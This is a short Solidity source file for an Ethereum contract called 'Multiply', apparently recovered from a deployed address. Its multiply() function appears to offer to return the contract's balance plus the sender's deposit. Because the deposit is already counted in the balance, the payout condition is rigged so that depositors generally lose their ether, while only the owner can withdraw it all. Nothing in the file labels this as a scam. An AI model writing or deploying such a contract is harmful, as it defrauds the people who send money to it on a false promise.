/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Multiply at 0x3bafb3af16203c817ee9208c6b8a748398dae689
*/
pragma solidity ^0.4.17;
contract Multiply {

    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function multiply(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}